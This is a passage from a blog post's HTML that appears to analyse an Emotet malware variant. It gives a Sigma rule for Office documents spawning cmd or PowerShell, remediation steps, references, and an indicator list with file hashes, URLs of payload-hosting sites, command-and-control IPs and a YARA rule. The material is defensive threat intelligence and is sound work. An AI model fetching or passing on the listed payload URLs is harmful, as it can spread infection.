</span></span><span style="display:flex;"><span>  <span style="color:#f92672">process_creation</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">EventID</span>: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ParentImage|endswith</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;\WINWORD.EXE&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;\excel.exe&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Image|endswith</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;\cmd.exe&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;\powershell.exe&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">condition</span>: <span style="color:#ae81ff">selection and process_creation</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">falsepositives</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">Legitimate macro usage with command execution</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">level</span>: <span style="color:#ae81ff">high</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="remediation-steps">Remediation Steps<a hidden class="anchor" aria-hidden="true" href="#remediation-steps">#</a></h3>
<ol>
<li>Isolate affected systems from the network immediately</li>
<li>Remove persistence mechanisms:
<ul>
<li>Delete scheduled tasks associated with Emotet</li>
<li>Remove registry entries mentioned in IOCs</li>
</ul>
</li>
<li>Clean infected files:
<ul>
<li>Delete malicious executables in %APPDATA% and %TEMP% directories</li>
<li>Remove malicious document from user&rsquo;s download folder/email</li>
</ul>
</li>
<li>Scan system with updated antivirus and EDR tools</li>
<li>Reset all credentials accessed from the infected system</li>
<li>Monitor network traffic for C2 communication attempts</li>
<li>Implement email filtering to block malicious document attachments</li>
</ol>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>This Emotet variant demonstrates the continuing evolution of this threat, with enhanced anti-analysis techniques and a multi-stage infection process. Its ability to deliver secondary payloads makes it a significant threat to organizations, potentially leading to data theft, financial fraud, or ransomware infections. The modular nature of Emotet makes it adaptable and persistent, requiring comprehensive security measures for prevention and detection.</p>
<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
<ul>
<li><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-280a">CISA Alert AA20-280A: Emotet Malware</a></li>
<li><a href="https://attack.mitre.org/software/S0367/">MITRE ATT&amp;CK: Emotet</a></li>
<li><a href="https://example-security-blog.com/emotet-2023-q1">Malware Analysis Report - Emotet Evolution 2023 Q1</a></li>
<li><a href="https://example-research-institute.org/emotet-analysis">Emotet Technical Deep-Dive</a></li>
</ul>
<h2 id="ioc-list">IOC List<a hidden class="anchor" aria-hidden="true" href="#ioc-list">#</a></h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#75715e"># File Hashes (SHA256)</span>
</span></span><span style="display:flex;"><span>a5b68ef45d76d647d80f3134d43c0aee3b099dae63aaa940af59cb7c9e01c847
</span></span><span style="display:flex;"><span>e8c3a8b6e3763d81027aa35a1a6a8e0c13054c1a977aa719abf14bdd6f585d24
</span></span><span style="display:flex;"><span>f1bff3d62ad2af7cbe5a5518618710a6f92a4ea3f0ec5df6258e528baa1d5978
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Domains</span>
</span></span><span style="display:flex;"><span>morrishillconstruction<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>admin<span style="color:#f92672">/</span>js<span style="color:#f92672">/</span><span style="color:#ae81ff">57839</span><span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span>ezlabsdirect<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>css<span style="color:#f92672">/</span><span style="color:#ae81ff">86743</span><span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span>earlyyearsbooks<span style="color:#f92672">.</span>co<span style="color:#f92672">.</span>uk<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>content<span style="color:#f92672">/</span>languages<span style="color:#f92672">/</span><span style="color:#ae81ff">94756</span><span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span>bestcrosses<span style="color:#f92672">.</span>ru<span style="color:#f92672">/</span>cgi<span style="color:#f92672">-</span>bin<span style="color:#f92672">/</span><span style="color:#ae81ff">19275</span><span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span>bmsautomation<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>admin<span style="color:#f92672">/</span>css<span style="color:#f92672">/</span><span style="color:#ae81ff">87365</span><span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># IPs</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">45.153</span><span style="color:#f92672">.</span><span style="color:#ae81ff">241</span>[<span style="color:#f92672">.</span>]<span style="color:#ae81ff">209</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">192.185</span><span style="color:#f92672">.</span><span style="color:#ae81ff">128</span>[<span style="color:#f92672">.</span>]<span style="color:#ae81ff">183</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">160.153</span><span style="color:#f92672">.</span><span style="color:#ae81ff">128</span>[<span style="color:#f92672">.</span>]<span style="color:#ae81ff">158</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">184.168</span><span style="color:#f92672">.</span><span style="color:#ae81ff">221</span>[<span style="color:#f92672">.</span>]<span style="color:#ae81ff">41</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">103.75</span><span style="color:#f92672">.</span><span style="color:#ae81ff">201</span>[<span style="color:#f92672">.</span>]<span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># YARA Rule</span>
</span></span><span style="display:flex;"><span>rule Emotet_Payload_2023 {
</span></span><span style="display:flex;"><span>    meta:
</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Detects Emotet payload 2023 variant&#34;</span>
</span></span><span style="display:flex;"><span>        author <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Beta Blue Gate&#34;</span>
</span></span><span style="display:flex;"><span>        date <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;2023-01-15&#34;</span>
</span></span><span style="display:flex;"><span>    strings:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>s1 <span style="color:#f92672">=</span> { <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">8</span>B C4 <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">58</span> <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">56</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">83</span> EC <span style="color:#ae81ff">30</span> }
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>s2 <span style="color:#f92672">=</span> { <span style="color:#ae81ff">83</span> F9 <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">0</span>F <span style="color:#ae81ff">85</span> <span style="color:#960050;background-color:#1e0010">??</span> <span style="color:#960050;background-color:#1e0010">??</span> <span style="color:#960050;background-color:#1e0010">??</span> <span style="color:#960050;background-color:#1e0010">??</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">33</span> C9 }
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>s3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;GetCommandLineA&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>s4 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;LoadLibraryA&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>s5 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;GetProcAddress&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>s6 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;VirtualAlloc&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>s7 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;VirtualProtect&#34;</span>
</span></span><span style="display:flex;"><span>    condition:
</span></span><span style="display:flex;"><span>        uint16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x5A4D</span> <span style="color:#f92672">and</span>
</span></span><span style="display:flex;"><span>        filesize <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">500</span>KB <span style="color:#f92672">and</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>s1 <span style="color:#f92672">and</span>
</span></span><span style="display:flex;"><span>        (all of (<span style="color:#f92672">$</span>s3, <span style="color:#f92672">$</span>s4, <span style="color:#f92672">$</span>s5, <span style="color:#f92672">$</span>s6, <span style="color:#f92672">$</span>s7)) <span style="color:#f92672">and</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>s2
</span></span><span style="display:flex;"><span>} 
</span></span></code></pre></td></tr></table>
</div>
</div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:35527/tags/malware/">Malware</a></li>
      <li><a href="http://localhost:35527/tags/analysis/">Analysis</a></li>
      <li><a href="http://localhost:35527/tags/hunin/">Hunin</a></li>
      <li><a href="http://localhost:35527/tags/blue-team/">Blue Team</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:35527/">BlueGates</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
